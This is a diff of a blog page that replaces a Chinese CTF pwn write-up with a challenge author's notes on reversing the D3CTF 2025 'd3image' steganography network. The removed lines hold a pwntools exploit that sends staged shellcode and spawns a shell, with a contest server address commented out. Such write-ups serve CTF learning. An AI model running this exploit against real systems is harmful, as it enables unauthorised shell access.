@@ -13,24 +13,31 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2024/11/04/省赛小记/"/>
+    <link rel="canonical" href="http://example.com/2025/06/02/d3image/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="O.o 遗憾下播，会做一道，但是比赛的时候脑子抽风了，索性队伍不差我这100分所以没有难过到自责的地步。 shellcode受到之前做的题目影响有点大，，看到禁了syscall然后open,read过下意识以为侧信道相关 不过没开沙箱，实际上利用手段非常多，0xa也比上次侧信道的0x6要多很多字节，最后半个小时想过换方法不过可能最近状态不好，最后0解下播。 实际上是栈上脏数据reread,第二天重">
+        <meta name="description" content="在 D3ctf2025 选手反馈中荣获最有趣的题目">
 <meta property="og:type" content="article">
-<meta property="og:title" content="省赛小记">
-<meta property="og:url" content="http://example.com/2024/11/04/%E7%9C%81%E8%B5%9B%E5%B0%8F%E8%AE%B0/index.html">
+<meta property="og:title" content="d3image出题手记">
+<meta property="og:url" content="http://example.com/2025/06/02/d3image/index.html">
 <meta property="og:site_name" content="Z1naX5">
-<meta property="og:description" content="O.o 遗憾下播，会做一道，但是比赛的时候脑子抽风了，索性队伍不差我这100分所以没有难过到自责的地步。 shellcode受到之前做的题目影响有点大，，看到禁了syscall然后open,read过下意识以为侧信道相关 不过没开沙箱，实际上利用手段非常多，0xa也比上次侧信道的0x6要多很多字节，最后半个小时想过换方法不过可能最近状态不好，最后0解下播。 实际上是栈上脏数据reread,第二天重">
+<meta property="og:description" content="在 D3ctf2025 选手反馈中荣获最有趣的题目">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-11-04T08:08:28.000Z">
-<meta property="article:modified_time" content="2024-11-04T08:23:49.179Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250601174309.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250601174613.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250601174825.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250601175335.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250601175235.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250601175216.png">
+<meta property="article:published_time" content="2025-06-02T13:35:53.000Z">
+<meta property="article:modified_time" content="2025-06-02T13:22:01.599Z">
 <meta property="article:author" content="Z1naX5">
-<meta property="article:tag" content="wp">
-<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="Misc">
+<meta property="article:tag" content="出题手记">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250601174309.png">
     
     
     <!--- Icon Part-->
@@ -42,7 +49,7 @@
     
     <title>
         
-            省赛小记 -
+            d3image出题手记 -
         
         Zena Xu
     </title>
@@ -476,7 +483,7 @@
 
         <div class="statistics flex justify-around my-2.5">
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">11</div>
         <div class="label text-third-text-color text-sm">Tags</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
@@ -484,7 +491,7 @@
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">21</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">18</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -509,8 +516,12 @@
 
         <div class="article-title relative w-full">
             
-                <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">省赛小记</h1>
+                
+                
+                <img src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250601174613.png" alt="d3image出题手记" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">d3image出题手记</h1>
                 </div>
             
             </div>
@@ -529,15 +540,15 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2024-11-04 16:08:28</span>
-        <span class="mobile">2024-11-04 16:08:28</span>
+        <span class="desktop">2025-06-02 21:35:53</span>
+        <span class="mobile">2025-06-02 21:35:53</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-11-04 16:23:49</span>
-            <span class="mobile">2024-11-04 16:23:49</span>
+            <span class="desktop">2025-06-02 21:22:01</span>
+            <span class="mobile">2025-06-02 21:22:01</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -549,11 +560,11 @@
             <ul>
                 
                     <li>
-                        <a href="/tags/wp/">wp</a>&nbsp;
+                        <a href="/tags/Misc/">Misc</a>&nbsp;
                     </li>
                 
                     <li>
-                        | <a href="/tags/Pwn/">Pwn</a>&nbsp;
+                        | <a href="/tags/%E5%87%BA%E9%A2%98%E6%89%8B%E8%AE%B0/">出题手记</a>&nbsp;
                     </li>
                 
             </ul>
@@ -563,12 +574,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>330 Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>873 Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>1 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>3 Mins</span>
         </span>
     
     
@@ -587,14 +598,67 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <p>O.o</p>
-<p>遗憾下播，会做一道，但是比赛的时候脑子抽风了，索性队伍不差我这100分所以没有难过到自责的地步。</p>
-<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>受到之前做的题目影响有点大，，看到禁了syscall然后open,read过下意识以为侧信道相关</p>
-<p>不过没开沙箱，实际上利用手段非常多，0xa也比上次侧信道的0x6要多很多字节，最后半个小时想过换方法不过可能最近状态不好，最后0解下播。</p>
-<p>实际上是栈上脏数据reread,第二天重打还是挺快就通了的</p>
-<p>exp:</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./shellcode&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p=remote(&quot;139.155.126.78&quot;,38696)</span></span><br><span class="line">p= process(elf_path)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	pop rax</span></span><br><span class="line"><span class="string">	pop rdx</span></span><br><span class="line"><span class="string">	pop rsi</span></span><br><span class="line"><span class="string">	pop rsi</span></span><br><span class="line"><span class="string">	sub rax,0x41</span></span><br><span class="line"><span class="string">	call rax</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.send(shellcode)</span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>) <span class="comment"># 第二次分配内存会在之前的上面加上0xa，但是写入还是从上次开始写，所以随便填个0xa的内存就行了</span></span><br><span class="line">shellcode+=asm(shellcraft.sh())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;input: &#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
-<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>后面还有两道，apple这道是高版本libc，但是洞是明显的。比赛的时候可能不太容易做出来，，或许应该抽时间深入学学io_file</p>
+            <h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>此题的预期解是选手能够意识对网络模型进行逆向建模，只需要正确写出反向的网络与运算规则，把题目给出的模型加载进新的框架即可得到flag。<br>在这样的情况下，选手端需要的资源并不多，仅需满足以下环境：</p>
+<ul>
+<li>Python 解释器版本需与题目要求的 PyTorch 版本匹配</li>
+<li>其余缺失库选择pip默认安装版本即可</li>
+<li>cuda并非必须的，你可以把所有的张量都移动到cpu上运算。</li>
+</ul>
+<p>在收到的 wp 中，很高兴大部分选手都使用了正确的思路，下面详细的解释一下这个思路的实现与可行性。</p>
+<p>首先，分析网络框架：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250601174309.png"
+                      alt="20250601174309"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250601174613.png"
+                      alt="20250601174613"
+                ></p>
+<p>每个block大致如上图，标注的文字信息与代码截图对应。</p>
+<ul>
+<li>蓝色部分：基础张量运算（均存在数学逆运算）；</li>
+<li>绿色箭头：输入输出变换（方向固定，不可逆）；</li>
+<li>黑色箭头：可逆运算路径。</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250601174825.png"
+                      alt="20250601174825"
+                ></p>
+<p>根据如上思路，我们只需要在 model.py，d3net.py 和 block.py 中作如下修改即可：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250601175335.png"
+                      alt="20250601175335"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250601175235.png"
+                      alt="20250601175235"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250601175216.png"
+                      alt="20250601175216"
+                ></p>
+<p>其次，dwt 与 iwt 在图像处理中本身就互为一对逆运算。</p>
+<p>最后，逆向网络还需要 y2 ,在题目附件中提供了一个名为 auxiliary_variable 的函数来辅助完成。经实验与数学验证，y2 可为任意与 y1 同形状的张量，不影响最终结果。</p>
+<p>修改后的decode如下：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">steg</span>):</span><br><span class="line">    output_steg = transform2tensor(steg)</span><br><span class="line">    output_steg = dwt(output_steg)</span><br><span class="line">    backward_z = gauss_noise(output_steg.shape)</span><br><span class="line"></span><br><span class="line">    output_rev = torch.cat((output_steg, backward_z), <span class="number">1</span>)</span><br><span class="line">    bacward_img = d3net(output_rev, rev=<span class="literal">True</span>)</span><br><span class="line">    secret_rev = bacward_img.narrow(<span class="number">1</span>, <span class="number">4</span> * <span class="number">3</span>, bacward_img.shape[<span class="number">1</span>] - <span class="number">4</span> * <span class="number">3</span>)</span><br><span class="line">    secret_rev = iwt(secret_rev)</span><br><span class="line"></span><br><span class="line">    image = secret_rev.view(-<span class="number">1</span>) &gt; <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    candidates = Counter()</span><br><span class="line">    bits = image.data.<span class="built_in">int</span>().cpu().numpy().tolist()</span><br><span class="line">    <span class="keyword">for</span> candidate <span class="keyword">in</span> bits_to_bytearray(bits).split(<span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span>):</span><br><span class="line">        candidate = bytearray_to_text(<span class="built_in">bytearray</span>(candidate))</span><br><span class="line">        <span class="keyword">if</span> candidate:</span><br><span class="line">            candidates[candidate] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(candidates) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Failed to find message.&#x27;</span>)</span><br><span class="line">    candidate, count = candidates.most_common(<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(candidate)</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="预期中的非预期解"><a href="#预期中的非预期解" class="headerlink" title="预期中的非预期解"></a>预期中的非预期解</h3><p>当然，由于这道题的定位是<code>趣味</code>，所以在这种需要看出可逆向的结构之外，亦可基于以下方法求解（力大砖飞需更高算力，但笔记本电脑可胜任）：</p>
+<p>具体做法是，选手自行选一个图像数据集，通过题目模型加密生成“密文-明文”配对数据；然后以加密数据为输入，原始数据为标签，训练一个自定义解密模型。</p>
+<p>这个方法的可行性在于，由于题目最终输出为二进制形式，解密问题被简化为二分类任务，再加上校验码可以降低对最后精确度的要求，所以对解密网络的训练难度与网络深度要求大大降低。</p>
+<p>如果题目是把图片隐写到图片里，那么训练一个解密网络的难度将会大大增加，因为本意只是想在一天内给选手们一个有趣的简单轻量AI题，专注在网络本身，而不是演变为算力比拼或者过于脑电波，所以在任务上没有继续加深难度，也给出了大部分的代码。</p>
+<p>非常遗憾也因为题目代码量较小，选手可以使用 AI 来理解工程代码，并快速的得到解答。但还是希望选手能够从中感受到题目本身“不需要训练 AI 的 AI 题”的趣味性。</p>
+<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a class="link"   target="_blank" rel="noopener" href="https://openaccess.thecvf.com/content/ICCV2021/html/Jing_HiNet_Deep_Image_Hiding_by_Invertible_Network_ICCV_2021_paper.html?ref=https://githubhelp.com" >HiNet: Deep Image Hiding by Invertible Network <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://arxiv.org/abs/1901.03892" >SteganoGAN: High Capacity Image Steganography with GANs <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 
         </div>
 
@@ -602,18 +666,18 @@
             <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> 省赛小记</li>
+        <li><strong>Title:</strong> d3image出题手记</li>
         <li><strong>Author:</strong> M1aoo0bin</li>
         <li><strong>Created at
-                :</strong> 2024-11-04 16:08:28</li>
+                :</strong> 2025-06-02 21:35:53</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-11-04 16:23:49
+                    :</strong> 2025-06-02 21:22:01
             </li>
         
         <li>
-            <strong>Link:</strong> https://redefine.ohevan.com/2024/11/04/省赛小记/
+            <strong>Link:</strong> https://redefine.ohevan.com/2025/06/02/d3image/
         </li>
         <li>
             <strong>
@@ -635,11 +699,11 @@
             <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                 
                     <li class="tag-item mx-0.5">
-                        <a href="/tags/wp/">#wp</a>&nbsp;
+                        <a href="/tags/Misc/">#Misc</a>&nbsp;
                     </li>
                 
                     <li class="tag-item mx-0.5">
-                        <a href="/tags/Pwn/">#Pwn</a>&nbsp;
+                        <a href="/tags/%E5%87%BA%E9%A2%98%E6%89%8B%E8%AE%B0/">#出题手记</a>&nbsp;
                     </li>
                 
             </ul>
@@ -650,29 +714,14 @@
         
             <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                 
-                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="prev"
-                        rel="prev"
-                        href="/2024/11/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3pwn%E2%80%94%E2%80%94HashNote/"
-                        >
-                            <span class="left arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">长城杯半决pwn——HashNote</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
                 
                     <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="next"
                         rel="next"
-                        href="/2024/10/17/%E8%B4%AA%E5%BF%83%E4%B8%8D%E8%B6%B3/"
+                        href="/2025/03/18/Hgamefinal2025/"
                         >
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">贪心不足</span>
+                                <span class="post-nav-title-item">Hgame-final-2025-pwn-BackTo2016</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex justify-center items-center">
@@ -693,8 +742,8 @@
             <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">On this page</div>
-        <div class="page-title">省赛小记</div>
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#shellcode"><span class="nav-number">1.</span> <span class="nav-text">shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text"></span></a></li></ol>
+        <div class="page-title">d3image出题手记</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="nav-number">1.</span> <span class="nav-text">预期解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F%E4%B8%AD%E7%9A%84%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="nav-number">2.</span> <span class="nav-text">预期中的非预期解</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="nav-number"></span> <span class="nav-text">参考：</span></a>
 
     </div>
 </div>
